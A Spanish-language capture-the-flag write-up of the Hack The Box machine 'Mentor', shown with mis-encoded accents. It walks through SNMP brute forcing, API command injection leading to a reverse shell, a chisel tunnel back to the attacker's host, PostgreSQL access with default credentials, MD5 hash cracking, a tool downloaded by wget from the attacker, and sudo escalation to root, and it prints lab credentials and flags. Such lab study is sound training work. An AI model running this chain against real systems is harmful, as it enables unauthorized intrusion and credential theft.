---
tags:
- ctf
- nmap
- snmp
- feroxbuster
- snmp-brute
- snmpbulkwalk
- command-injection
- postgresql
- chisel
title: Mentor- Medium (HTB)
permalink: /Mentor-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

`Mentor` es una m√°quina `Linux` de dificultad media cuya ruta incluye pivotar a trav√©s de cuatro usuarios diferentes antes de llegar a `root`. Despu√©s de escanear un servicio `SNMP` con una cadena comunitaria que puede ser forzada bruta, se descubren credenciales de texto plano que se utilizan para un punto final `API`, que resulta ser vulnerable a la ejecuci√≥n de c√≥digo remoto ciego y conduce a un punto de apoyo en un contenedor de `docker`. Enumerar la red de containers revela un servicio `PostgreSQL` en otro contenedor, que se puede aprovechar en `RCE` mediante la autenticaci√≥n utilizando credenciales predeterminadas. Examinar una copia de seguridad de base de datos antigua en el contenedor PostgreSQL revela un `hash`, que una vez agrietado se utiliza para `SSH` en la m√°quina. Finalmente, al examinar los archivos de configuraci√≥n en el host, el atacante puede recuperar una contrase√±a para el usuario `james`, que puede ejecutar el comando `/bin/sh` con privilegios sudo, perdiendo instant√°neamente los privilegios `root`.

# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.228.102
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 19:22 -03
Nmap scan report for 10.129.228.102
Host is up (0.89s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.36 seconds
```

## Website / Port 80

En la pagina principal se ven citas de algun autor, pero mas alla de eso nada mas.

![image-center](/assets/images/{72A923D2-7A03-41E6-B8D3-4BCF28302B86}.png)

### Feroxbuster enumeration

De por si el escaneo no revela nada interesante ya que la √∫nica ruta me devuelve un `Forbidden`.

```bash
feroxbuster -u http://mentorquotes.htb
                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.13.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://mentorquotes.htb/
 üö©  In-Scope Url          ‚îÇ mentorquotes.htb
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.13.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      167l      621w     5506c http://mentorquotes.htb/
403      GET        9l       28w      281c http://mentorquotes.htb/server-status
[####################] - 6m     30000/30000   0s      found:2       errors:33     
[####################] - 6m     30000/30000   87/s    http://mentorquotes.htb/
```

### Vhost enumeration

```bash
wfuzz -c -t 200 -H "Host: FUZZ.mentorquotes.htb" -u http://mentorquotes.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hl=9
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000051:   404        0 L      2 W        22 Ch       "api"
```

Como me descubre un nuevo `vhost` , lo agrego al archivo `/etc/hosts` para poder tener resolucion en la pagina.

![image-center](/assets/images/{31547EA5-5A5B-4587-9EAE-7119C3B2888A}.png)

No veo nada interesante

### Directory bruteforce on api.mentorquotes.htb

```bash
 feroxbuster -u http://api.mentorquotes.htb -x py
                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.13.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://api.mentorquotes.htb/
 üö©  In-Scope Url          ‚îÇ api.mentorquotes.htb
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.13.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [py]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET        1l        2w       22c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
307      GET        0l        0w        0c http://api.mentorquotes.htb/admin => http://api.mentorquotes.htb/admin/
307      GET        0l        0w        0c http://api.mentorquotes.htb/docs/ => http://api.mentorquotes.htb/docs
200      GET       69l      212w     2637c http://api.mentorquotes.htb/docs/oauth2-redirect
200      GET        1l       48w     7676c http://api.mentorquotes.htb/openapi.json
200      GET       31l       62w      969c http://api.mentorquotes.htb/docs
307      GET        0l        0w        0c http://api.mentorquotes.htb/users => http://api.mentorquotes.htb/users/
307      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        1l        3w       31c http://api.mentorquotes.htb/admin/backup
405      GET        1l        3w       31c http://api.mentorquotes.htb/users/add
403      GET        9l       28w      285c http://api.mentorquotes.htb/server-status
[####################] - 24m   120005/120005  0s      found:9       errors:44546  
[####################] - 23m    30000/30000   22/s    http://api.mentorquotes.htb/ 
[####################] - 23m    30000/30000   22/s    http://api.mentorquotes.htb/admin/ 
[####################] - 23m    30000/30000   22/s    http://api.mentorquotes.htb/users/ => Wildcard dir! stopped recursion
[####################] - 24m    30000/30000   21/s    http://api.mentorquotes.htb/quotes/ => Wildcard dir! stopped recursion
```

### admin

Veo varias rutas, empezando por la ruta admin veo lo siguiente.

![image-center](/assets/images/{E88D4904-EEEC-489A-98BA-9B75A9496C62}.png)

### Docs

En la ruta docs veo el comportamiento de la api donde puedo ejecutar acciones como el logueo, y la autenticaci√≥n entre otras mas.

![image-center](/assets/images/{D0AE0B2E-3245-4084-A677-4BA1210F1505}.png)

#### auth/login

En el apartado de `auth/login` si toco en el bot√≥n en la parte superior que dice `Try it out` me sale una interfaz en la cual puedo comprobar el envio de datos y como se veria la respuesta.

![image-center](/assets/images/{906D2CC2-5F03-4865-B2CB-88C6291C3490}.png)

Si envio eso de ejemplo me sale el siguiente mensaje:

![image-center](/assets/images/{0D01D593-0788-402A-B0EA-D81DFED5EC73}.png)

Quiz√°s sea porque no estoy logueado, pero si me voy a la secci√≥n de `/auth/signup` puedo registrar al usuario por las dudas pruebo de nuevo con credenciales.

![image-center](/assets/images/{8531D6C3-9772-495A-BCD3-50D2664F9146}.png)

Es as√≠ como veo un token de sesi√≥n por lo que parece. el cual puedo usarlo en el endpoint `/users/` por el metodo `GET`. Intercepte la peticion donde tengo que agregar el `Header` `Authorization` con el dato del token

### Users

Enviando el token me sale el siguiente mensaje, por lo que estoy encerrado por el momento

![image-center](/assets/images/{3CB449D2-153D-4E75-B5D2-9979719253EE}.png)

Debido a que y a que no hay mas puertos por enumerar, paso al escaneo `UDP`. 

## SNMP / Port 161

```bash
nmap -sU -v -T4 -F 10.129.228.102
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 19:39 -03
Initiating Ping Scan at 19:39
Scanning 10.129.228.102 [4 ports]
Completed Ping Scan at 19:39, 0.58s elapsed (1 total hosts)
Initiating UDP Scan at 19:39
Scanning mentorquotes.htb (10.129.228.102) [100 ports]
Discovered open port 161/udp on 10.129.228.102
```

Descubro el puerto `161` perteneciente al protocolo `snmp`, lo primero para poder enumerar estos es localizar la `Community strings`, para eso podemos usar la herramienta `onesixtyone` o en mi caso use [snmp-brute.py](https://github.com/SECFORCE/SNMP-Brute).

```bash
python3 snmpbrute.py -t 10.129.228.102
   _____ _   ____  _______     ____             __     
  / ___// | / /  |/  / __ \   / __ )_______  __/ /____ 
  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/ 

SNMP Bruteforce & Enumeration Script v2.0
http://www.secforce.com / nikos.vassakis <at> secforce.com
[..snip..]

10.129.228.102 : 161    Version (v2c):  internal
10.129.228.102 : 161    Version (v1):   public
Waiting for late packets (CTRL+C to stop)
10.129.228.102 : 161    Version (v2c):  public
10.129.228.102 : 161    Version (v1):   public
10.129.228.102 : 161    Version (v2c):  public

Trying identified strings for READ-WRITE ...

Identified Community strings
        0) 10.129.228.102  internal (v2c)(RO)
        1) 10.129.228.102  public (v1)(RO)
        2) 10.129.228.102  public (v2c)(RO)
        3) 10.129.228.102  public (v1)(RO)
        4) 10.129.228.102  public (v2c)(RO)
```

Es asi como consigo dos : `internal` y `public` siendo la segunda la mas comun de encontrar, empiezo enumerando el protocolo con la herramienta `snmpbulkwalk`.

```bash
snmpbulkwalk -c internal -v2c mentorquotes.htb | tee snmpdata
```

Luego de leer todo el archivo veo unas credenciales en un script de `python`

```bash
iso.3.6.1.2.1.25.4.2.1.5.2084 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

La misma la puedo usar para el usuario james que es el que aparece nombrado al principio de la pagina.

### Token

![image-center](/assets/images/{44D244FA-2F9A-4BBD-874C-DF9DF4469EF0}.png) 

Es asi como consigo su token y asi mismo puedo empezar a jugar. 

## Shell as root on container

El mismo token lo coloco en la cabecera en `Burpsuite` y me sale lo siguiente.

![image-center](/assets/images/{6D499D39-DBDC-4113-A52D-F7FA68C4EF5E}.png)

### Fuzzing /admin

Sin nada mas decid√≠ `fuzzear` por el directorio `admin/`.

```bash
feroxbuster -u http://api.mentorquotes.htb/admin -x py
                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.13.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://api.mentorquotes.htb/admin
 üö©  In-Scope Url          ‚îÇ api.mentorquotes.htb
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.13.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [py]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET        1l        2w       22c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
307      GET        0l        0w        0c http://api.mentorquotes.htb/admin => http://api.mentorquotes.htb/admin/
405      GET        1l        3w       31c http://api.mentorquotes.htb/admin/backup
422      GET        1l        3w      186c http://api.mentorquotes.htb/admin/check
[#######>------------] - 2m     11873/30000   3m      found:3       errors:10     
[#######>------------] - 2m     11972/30000   3m      found:3       errors:10     
üö® Caught ctrl+c üö® saving scan state to ferox-http_api_mentorquotes_htb_admin-1764289507.state ...
[#######>------------] - 2m     11991/30000   3m      found:3       errors:10     
[###>----------------] - 2m      5979/30000   45/s    http://api.mentorquotes.htb/admin/
```

Despu√©s de un rato veo las rutas `/check` y `/backup` , `check` me daba un mensaje irrelevante y despu√©s en `backup` puse los datos el usuario `admin` y me sali√≥ el siguiente error.

![image-center](/assets/images/{3FE04AD0-C517-4843-A903-B30C315D38FB}.png)

## Command injection

Requiere de un `path`, capaz de refiere a una ruta del sistema, probando con `/home` me sale lo siguiente.

![image-center](/assets/images/{67045A4B-668C-4731-8F01-8227253065F8}.png)

Pareciera como si se realizara un comando por detr√°s el cual no se o quiz√°s la ejecuci√≥n de un script, por lo que se me ocurre una inyecci√≥n de comandos en alguno de los valores.

Probando con una inyeccion como esta. Aclaraci√≥n: Saque los dem√°s valores ya que testeando me di cuenta q no hac√≠an falta

![image-center](/assets/images/{A9EEA6E1-6F8B-450B-A0C9-D02816C093E6}.png)

Y desde mi maquina recibo la traza.

```bash
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:43:19.697360 IP mentorquotes.htb > 10.10.17.19: ICMP echo request, id 18688, seq 0, length 64
21:43:19.700626 IP 10.10.17.19 > mentorquotes.htb: ICMP echo reply, id 18688, seq 0, length 64
```

Por lo que ahora puedo enviarme una `shell` a mi maquina.

![image-center](/assets/images/{13E066ED-2C2D-48E4-82BD-FFC4197E1516}.png)

Y desde mi maquina recibo la shell como `root` pero en un contenedor de `Docker`. Igualmente puedo visualizar la flag.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.228.102] 45573
whoami
root
```

```bash
hostname -i
172.22.0.3
```

```bash
/home/svc # cat user.txt
54474e516feded25fdc2a6cdab1cf1f6
```

## Shell as svc

Ya una vez dentro de la maquina veo varios archivos de `python`.
### Database file

El siguiente archivo destaca entre los dem√°s debido a que se ve como se realiza la conexi√≥n a una base de datos `Postgresql`, en otro contenedor por lo que parece.

```python
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)

# Databases query builder
database = Database(DATABASE_URL)
```

Podr√≠a tratar de conectarme yo mismo debido a que en el contenedor escasean las `tools` como `psql` para poder realizar la conexi√≥n a la base de datos. Por lo que sub√≠ `chisel` para poder entablar un t√∫nel `SOCKS5`, con el siguiente comando.

Primero desde mi maquina creo el servidor al cual se va a conectar la maquina

```bash
./chisel server -p 5555 -reverse 
2025/11/28 02:26:13 server: Reverse tunnelling enabled
2025/11/28 02:26:13 server: Fingerprint cpFUHrSyHEp9ts57uiNkSp/WF1mKiZnJINyNRiMAWyU=
2025/11/28 02:26:13 server: Listening on http://0.0.0.0:5555
2025/11/28 02:32:14 server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Y desde el contenedor ejecuto este otro comando:

```bash
./chisel client 10.10.17.19:5555 R:socks
2025/11/28 05:34:09 client: Connecting to ws://10.10.17.19:5555
2025/11/28 05:34:14 client: Connected (Latency 351.69126ms)
```

Por lo que ya puedo usar `proxychains` para poder conectarme al otro contenedor y as√≠ a su base de datos.

### psql

```bash
 proxychains psql -h 172.22.0.1 -p 5432 -U postgres
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.22.0.1:5432  ...  OK
Password for user postgres: 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.22.0.1:5432  ...  OK
psql (18.0 (Debian 18.0-1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=#
```

### Recover passwords

Veo algunas bases de datos.

```bash
postgres=# \list
                                                       List of databases
      Name       |  Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | Locale | ICU Rules |   Access privileges   
-----------------+----------+----------+-----------------+------------+------------+--------+-----------+-----------------------
 mentorquotes_db | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 postgres        | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 template0       | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/postgres          +
                 |          |          |                 |            |            |        |           | postgres=CTc/postgres
 template1       | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/postgres          +
                 |          |          |                 |            |            |        |           | postgres=CTc/postgres
(4 rows)

```

Como veo la base de datos con el nombre de la maquina me conecto a la misma con `\c`.

```bash
postgres=# \c mentorquotes_db
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.22.0.1:5432  ...  OK
psql (18.0 (Debian 18.0-1), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
```

Dentro de la misma puedo listar las tablas, donde puedo `dumpear` los datos de las mismas con una sintaxis de SQL.

```bash
mentorquotes_db=# \dt
            List of tables
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

mentorquotes_db=# SELECT id, email, username, password FROM users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)
```

Como veo dos hashes puedo ir a la pagina [Crackstation](https://crackstation.net/) para poder romperlos ya que son f√°ciles, por el hecho de que son `md5`.

![image-center](/assets/images/{4DDB8B89-EC6F-4878-828D-E39DE9FCF10E}.png)

Una vez tengo la pass del usuario `svc` me conecto v√≠a `ssh`.

```bash
ssh svc@mentorquotes.htb
svc@mentorquotes.htb password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

[..snip..]

Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$ 
```
## Shell as james

### Enumeration

Ya dentro de la maquina como `svc` no veo nada interesante con mi enumeraci√≥n manual, as√≠ que sub√≠ `linpeas.sh` a la maquina para poder ver via de escalada a `root` o al usuario `james`.

```bash
 wget http://10.10.17.19/linpeas.sh
--2025-11-28 05:53:56--  http://10.10.17.19/linpeas.sh
Connecting to 10.10.17.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 954437 (932K) [application/x-sh]
Saving to: ‚Äòlinpeas.sh‚Äô

linpeas.sh                                     100%[===================================================================================================>] 932.07K   334KB/s    in 2.8s    

2025-11-28 05:54:01 (334 KB/s) - ‚Äòlinpeas.sh‚Äô saved [954437/954437]
```

Despu√©s de un an√°lisis del output veo un archivo de configuraci√≥n del protocolo `snmp`. Lo cual tiene sentido sabiendo que enumere ese servicio externamente.
### snmp.conf

```bash
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Analyzing SNMP Files (limit 70)
-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf                                                                                                                              
# rocommunity: a SNMPv1/SNMPv2c read-only access community name
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
createUser bootstrap MD5 SuperSecurePassword123__ DES
-rw------- 1 Debian-snmp Debian-snmp 1268 Nov 28 04:56 /var/lib/snmp/snmpd.conf

```

### Creds

Dentro del mismo veo unas credenciales, las cuales puedo probar si le pertenecen al usuario `james`.

```bash
svc@mentor:/tmp$ cat /etc/snmp/snmpd.conf | grep -v "#"

sysLocation    Sitting on the Dock of the Bay
sysContact     Me <admin@mentorquotes.htb>

sysServices    72


master  agentx


agentAddress udp:161,udp6:[::1]:161


view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1


rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly

rouser authPrivUser authpriv -V systemonly

includeDir /etc/snmp/snmpd.conf.d


createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv

com2sec AllUser default internal
group AllGroup v2c AllUser
view SystemView included .1.3.6.1.2.1.25.1.1
view AllView included .1
access AllGroup "" any noauth exact AllView none none
```

Pruebo `migrar` al usuario desde la maquina internamente antes de probar por `ssh` y veo que son validas.

```bash
svc@mentor:/tmp$ su james 
Password: 
james@mentor:/tmp$
```

## Shell as root 

Una vez dentro de la shell de `james` veo que el mismo tiene la capacidad de ejecutar `/bin/sh` como cualquier usuario.
```bash
james@mentor:/tmp$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
```

Como mi paso final es convertirme en `root` puedo usar `sudo` y ejecutar el binario.

```bash
james@mentor:/tmp$ sudo /bin/sh 
# whoami
root
```

```bash
# cat /root/root.txt
0221cce555e6ec37b253be0213f77dfb
```

`~Happy Hacking`

